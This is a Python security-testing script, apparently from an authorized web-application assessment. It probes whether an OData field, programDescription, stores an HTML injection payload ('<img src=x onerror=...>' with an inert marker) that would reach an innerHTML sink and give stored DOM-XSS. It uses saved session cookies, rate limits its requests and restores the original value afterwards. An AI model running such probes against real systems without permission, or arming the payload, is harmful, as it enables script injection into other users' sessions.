#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Track H #1 — MERGE Applications.programDescription with an inert marker.

Chain: programDescription → CommunicationMenu.fragment.xml text= binding
→ HtmlMenu.openBy() → innerHTML sink. If server accepts the MERGE and
the value persists, stored DOM-XSS in the applicant's Main view (self)
and potentially any staff-side view that reflects the field.

Budget: 1 batched MERGE + baseline read + verify + restore = 3 non-safe.
Payload uses inert 'KLXSS_HTMLMENU' marker — no alert() (per Track G
policy of not firing renderable payloads before cleanup).

Verdicts:
  inner 204 + persisted → CROWN JEWEL — halt, commit, restore, write up.
  inner 204 + silent-drop → server filters this field too (F1.1 pattern);
                             candidate closed.
  inner 400/403 → server rejects; candidate closed.
"""
import argparse
import json
import os
import sys

sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
import authz_matrix as m

APP_A = "000000503432"
ENT = f"Applications('{APP_A}')"
PAYLOAD = '<img src=x onerror="/*KLXSS_HTMLMENU_MARKER*/">KLXSS_PROGDESC'


def batched_merge(client, session, entity_rel, body_dict, logger, note):
    body, boundary = m._batch_body(
        [], changeset=[("MERGE", entity_rel, body_dict)])
    r = client.request(session, "POST", "$batch", body=body,
                       extra_headers={"Content-Type":
                                      f"multipart/mixed; boundary={boundary}"},
                       note=note)
    inners = m._parse_batch_inner_statuses(r.get("text", "") or "")
    inner = inners[0] if inners else None
    logger.log("h1", entity_rel, "POST $batch", note, r,
               [f"outer={r.get('status')}", f"inner={inner}",
                f"payload={json.dumps(body_dict)[:120]}"])
    return r.get("status"), inner


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--min-interval", type=float, default=8.0)
    args = ap.parse_args()
    m.MIN_INTERVAL = args.min_interval
    print(f"[cadence] MIN_INTERVAL={m.MIN_INTERVAL}", file=sys.stderr)

    client = m.Client()
    logger = m.MatrixLogger(m.JSONL_PATH, append=True)
    sA = m.Session("A", m.load_cookie_header(m.CREDS_DIR + "/A.cookies"))
    client.fetch_csrf(sA)

    # 1. Baseline
    rB = m.read_entity(client, sA, ENT, logger, "h1", "H1 baseline read")
    baseline = m.json_field(rB.get("text", ""), "programDescription")
    logger.log("h1", ENT, "NOTE", "H1 baseline captured",
               {"status": "n/a", "text": ""},
               [f"programDescription_baseline={baseline!r}"])
    print(f"[baseline] programDescription={baseline!r}", file=sys.stderr)

    landed = False
    try:
        # 2. Attempt the write
        outer, inner = batched_merge(client, sA, ENT,
                                       {"programDescription": PAYLOAD},
                                       logger, "H1 MERGE programDescription")
        # 3. Re-read
        rA = m.read_entity(client, sA, ENT, logger, "h1",
                            "H1 re-read after MERGE")
        after = m.json_field(rA.get("text", ""), "programDescription")
        landed = (after == PAYLOAD)
        flags = [f"outer={outer}", f"inner={inner}",
                 f"baseline={baseline!r}", f"after={after!r}",
                 f"field_changed={landed}"]
        if landed:
            flags.append("ANOMALY_STORED_DOM_XSS_CANDIDATE_PERSISTED")
        logger.log("h1", ENT, "COMPARE", "H1 verdict",
                   {"status": "n/a", "text": ""}, flags)
        print(f"\n=== H1 VERDICT ===", file=sys.stderr)
        print(f"  outer={outer} inner={inner}", file=sys.stderr)
        print(f"  baseline={baseline!r}", file=sys.stderr)
        print(f"  after   ={after!r}", file=sys.stderr)
        print(f"  landed  ={landed}", file=sys.stderr)
        if landed:
            print(f"\n  ⚠ CROWN JEWEL — programDescription accepted arbitrary HTML.",
                  file=sys.stderr)
            print(f"  Live-browser step: open Main view in A's session, click "
                  f"Chat menu; HtmlMenu.innerHTML fires the payload.",
                  file=sys.stderr)
        else:
            print(f"\n  CLEAN NEGATIVE — server did not persist the payload.",
                  file=sys.stderr)
    finally:
        if landed:
            print(f"\n=== RESTORE — reverting programDescription to baseline ===",
                  file=sys.stderr)
            restore_value = baseline if baseline is not None else ""
            outer_r, inner_r = batched_merge(client, sA, ENT,
                                              {"programDescription": restore_value},
                                              logger, f"H1 RESTORE programDescription={restore_value!r}")
            rV = m.read_entity(client, sA, ENT, logger, "h1",
                                "H1 verify restore")
            now = m.json_field(rV.get("text", ""), "programDescription")
            ok = (now == baseline) or (str(now) == str(baseline))
            logger.log("h1", ENT, "CLEANUP_VERIFY",
                        f"programDescription ok={ok}",
                        {"status": "n/a", "text": ""},
                        [f"cleanup_ok={ok}",
                         f"restore_inner={inner_r}",
                         f"observed={now!r}",
                         f"expected={baseline!r}"])
            print(f"  restore inner={inner_r}  cleanup_ok={ok}",
                  file=sys.stderr)
    return 0 if not landed else 1


if __name__ == "__main__":
    sys.exit(main())
